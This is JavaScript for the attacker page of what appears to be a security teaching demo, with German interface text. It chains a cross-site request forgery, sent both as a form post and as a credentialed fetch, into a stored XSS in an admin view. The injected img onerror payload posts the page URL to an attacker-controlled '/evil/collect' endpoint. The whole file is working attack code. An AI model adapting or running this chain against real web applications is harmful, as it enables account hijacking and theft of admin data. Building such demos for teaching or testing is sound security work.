(async () => {
    'use strict';
    const status = document.getElementById('status');
    try {
        const config = await fetch('/evil/config').then(response => response.json());
        const collector = config.attackerOrigin + '/evil/collect';
        const script = `this.onerror=null;fetch(${JSON.stringify(collector)},{method:"POST",mode:"no-cors",headers:{"Content-Type":"text/plain"},body:JSON.stringify({marker:"Stored XSS in der Adminansicht",page:location.href})})`;
        const attribute = script.replace(/&/g, '&amp;').replace(/"/g, '&quot;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
        const payload = `<img src="/demo-assets/missing.png" alt="Demo-Nachweis" onerror="${attribute}">`;
        document.getElementById('payload-preview').textContent = payload;
        const form = document.getElementById('attack-form');
        form.action = config.goodOrigin + '/security-demo/notes/me';
        document.getElementById('attack-text').value = payload;
        const button = document.getElementById('attack-btn');
        button.disabled = false;
        button.addEventListener('click', () => {
            form.submit();
            // Cross-origin iframe responses cannot be inspected by this page.
            // X-Frame-Options may block displaying the response AFTER the write.
            status.textContent = 'Formular abgeschickt. Prüfe die Notiz und lade danach die Adminübersicht.';
        });
        const jsonButton = document.getElementById('json-btn');
        jsonButton.disabled = false;
        jsonButton.addEventListener('click', async () => {
            try {
                const response = await fetch(form.action, {method:'POST', credentials:'include', headers:{'Content-Type':'application/json'}, body:JSON.stringify({text:payload})});
                if (!response.ok) throw new Error('Server antwortet mit ' + response.status + '.');
                status.textContent = 'Notiz überschrieben. Jetzt die Adminübersicht neu laden.';
            } catch (error) { status.textContent = 'Angriff abgewiesen oder CORS blockiert: ' + error.message; }
        });
    } catch (error) { status.textContent = 'Demo konnte nicht geladen werden: ' + error.message; }
})();
